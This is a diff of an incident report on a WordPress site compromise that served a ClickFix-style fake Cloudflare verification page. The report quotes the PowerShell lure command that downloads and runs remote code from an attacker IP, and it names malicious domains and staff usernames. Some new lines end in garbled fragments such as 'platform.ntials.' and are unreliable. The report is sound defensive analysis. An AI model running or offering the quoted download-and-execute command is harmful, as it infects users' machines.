@@ -2,15 +2,17 @@
 *7 Sept 2025, K. Tonkin & R. Halim*
 
 ## Executive Summary
-On September 5, 2025, the Breakers FWB website ```(https://www.breakersfwb.com)``` was discovered to be compromised. Malicious JavaScript was injected into the site, in which visitors had a fake Cloudflare “verification” page overlaid on top of the actual website, which was hosted on ```ncloud.icu``` and dynamically loaded via a `<iframe>`. The fraudulent verification page attempted to trick users into executing a PowerShell command that would download further payloads from ```155.94.155.25```. The site directed the user to verify by pressing Win+R and Ctrl+V to paste ```powershell -w h -nop -c iex(iwr -Uri 155[.]94[.]155[.]25 -UseBasicParsing)``` copied to their clipboard.
+On September 5, 2025, the Breakers FWB website (```https://www.breakersfwb.com```) was found to be compromised and actively serving a ClickFix-style social engineering campaign. Malicious JavaScript was injected into the site, overlaying a fake Cloudflare “verification” page hosted on ```ncloud.icu``` via a dynamically loaded <iframe>. This page mimicked legitimate security checks but was designed to exploit users’ instinct to “fix” perceived issues—hallmarks of the ClickFix technique.
+
+The fraudulent overlay instructed users to press Win+R and Ctrl+V to paste a PowerShell command copied to their clipboard: ```powershell -w h -nop -c iex(iwr -Uri 155[.]94[.]155[.]25 -UseBasicParsing)``` This command downloaded additional payloads from ```155.94.155.25```, consistent with ClickFix campaigns that rely on human interaction to bypass automated defenses
 
 Investigation showed evidence of:
-- Injected code calling external malicious domains (```getfix.win```, ```ncloud.icu```).  
-- Obfuscated JavaScript redirectors inserted server-side.  
-- Exposed WordPress user accounts, including the default ```admin``` and employee accounts ```ethanwhited``` & ```barbara``` (Barbara Martens).  
-- Spam blog posts unrelated to The Breakers’ business, created Sept 3-4, 2025.  
+- Server-side injection of obfuscated JavaScript redirectors.
+- External calls to malicious domains (getfix.win, ncloud.icu).
+- Exposure of WordPress user accounts (admin, ethanwhited, barbara).
+- SEO spam posts created Sept 3–4, 2025, unrelated to Breakers’ business.
 
-This indicates a WordPress site compromise, most likely through vulnerable plugins and/or weak credentials.
+The compromise likely originated from vulnerable WordPress plugins or weak credentials, and the site was repurposed as a malware distribution platform.ntials.
 
 ---
 
@@ -101,17 +103,16 @@ During investigation, several WordPress accounts were discovered that appear lin
 ---
 
 ## Conclusion
-The Breakers FWB website compromise appears to be the result of WordPress plugin exploitation leading to malicious script injection. Once access was obtained, the attackers combined two tactics:
+This incident reflects a textbook implementation of the ClickFix social engineering technique. The attackers exploited Breakers FWB’s WordPress vulnerabilities to inject malicious scripts and launch a deceptive “verification” overlay. This overlay mimicked legitimate services and instructed users to run clipboard-injected PowerShell commands—an approach designed to bypass automated defenses by relying on human interaction1.
 
-1. Traffic generation via SEO spam – Unrelated “casino/gambling” blog posts were created, likely to boost search visibility and attract users who are statistically more prone to clicking such links. This increases site traffic and funnels more victims into the malicious redirection chain.  
-2. Malware delivery via injected scripts – Visitors to this website had a fake Cloudflare “verification” page overlaid on top of the actual website (```getfix.win```), where they were tricked into executing a PowerShell command that downloaded further payloads from ```155.94.155.25```.  
+The site was not merely defaced—it was weaponized as a malware distribution hub. Remediation must include full restoration, credential resets, and hardening against reinfection. Ongoing monitoring and user education are critical to prevent future ClickFix-style attacks.not fully remediated.
 
-This indicates the attackers were not simply defacing the site but using it as a **malicious distribution platform**: leveraging The Breakers’ reputation and Google indexing to drive unsuspecting users into a malware infection flow.  
+---
 
-**Remediation** requires:  
-- Full site cleanup and restoration from a safe backup.  
-- Removal of injected scripts and spam posts.  
-- Reset and hardening of all user credentials.  
-- Systematic patching of WordPress core, themes, and plugins.  
+## References
+https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/
 
-Continuous monitoring is essential, as compromised WordPress sites are often reinfected if underlying vulnerabilities (plugins, weak credentials, or exposed endpoints) are not fully remediated.
+https://www.fortinet.com/blog/threat-research/clickfix-to-command-a-full-powershell-attack-chain
+
+https://www.hhs.gov/sites/default/files/clickfix-attacks-sector-alert-tlpclear.pdf
+
